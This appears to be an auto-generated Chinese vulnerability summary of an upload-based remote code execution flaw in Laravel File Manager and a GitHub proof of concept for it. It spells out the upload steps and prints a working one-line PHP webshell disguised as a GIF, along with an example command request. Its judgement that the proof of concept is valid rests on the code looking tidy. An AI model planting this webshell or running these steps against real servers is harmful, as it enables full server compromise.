## CVE-2025-58440 - Laravel File Manager Remote Code Execution

**漏洞编号:** CVE-2025-58440

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Laravel File Manager

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 12.0

**利用条件:** 需要目标系统运行Laravel File Manager，且版本在受影响范围内；需要能够访问/laravel-filemanager/upload路径。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于 Laravel File Manager 中，允许经过身份验证的攻击者通过上传包含恶意代码的文件来执行远程代码。漏洞利用方式如下：

1.  **漏洞原理：** 通过上传包含PHP代码的文件，利用文件管理器的上传功能，将恶意文件写入服务器。
2.  **利用步骤：**
    *   首先，需要获取目标系统的 CSRF token。POC代码中实现了`extract_csrf_token`函数来获取token.
    *   然后，构造一个包含恶意 PHP 代码的 Polyglot 文件（例如，伪装成图片的文件，包含GIF头和PHP代码）。POC代码中webshell的内容是`GIF89a;\n<?php if(isset($_POST['payload'])) { system($_POST['payload']); } ?>`，它将接收POST请求的`payload`参数作为系统命令来执行。
    *   使用 multipart/form-data 格式发送一个 POST 请求到 `/laravel-filemanager/upload` 路径，其中包含以下参数：
        *   `working_dir`: 上传文件的目标目录 (默认为/tmp)。
        *   `upload[]`: 包含恶意 PHP 代码的文件。
        *   `type`
        *   `_token`: CSRF token.
    *   成功上传后，通过访问上传的文件，并传递 `payload` 参数来执行任意系统命令。例如，如果上传的文件名为 `random.php.`,访问`target/random.php.?payload=id`
3.  **有效性评估：** 该POC代码利用了Laravel File Manager中的文件上传漏洞。搜索结果中未找到完全匹配的CVE-2025-58440，但是存在其他Laravel相关漏洞以及文件上传漏洞，例如 CVE-2025-58640 (XSS)，这表明该应用可能存在安全问题。提供的POC代码具有较高的可能性是有效的，因为它尝试利用文件上传功能执行代码，并且代码结构清晰，逻辑完整。
4.  **投毒风险评估：**
    *   POC代码本身的主要功能是利用漏洞进行远程代码执行，这是其核心意图。但是,POC代码中, 存在一定的投毒风险。通过分析`webshell_content`变量，发现其payload是通过`$_POST['payload']`接收参数，如果攻击者修改这个参数，可以上传其他恶意脚本或者执行其他恶意行为。所以,代码存在一定的投毒风险.
    *   风险等级：较低。虽然存在风险，但主要风险集中在用户是否会修改`webshell_content`，或者对生成的webshell进行二次利用上。原始POC的主要功能还是漏洞利用。
    *   结论： 投毒风险较低,大概在10%左右。

**项目地址:** [ph-hitachi/CVE-2025-58440](https://github.com/ph-hitachi/CVE-2025-58440)

**漏洞详情:** [CVE-2025-58440](https://nvd.nist.gov/vuln/detail/CVE-2025-58440)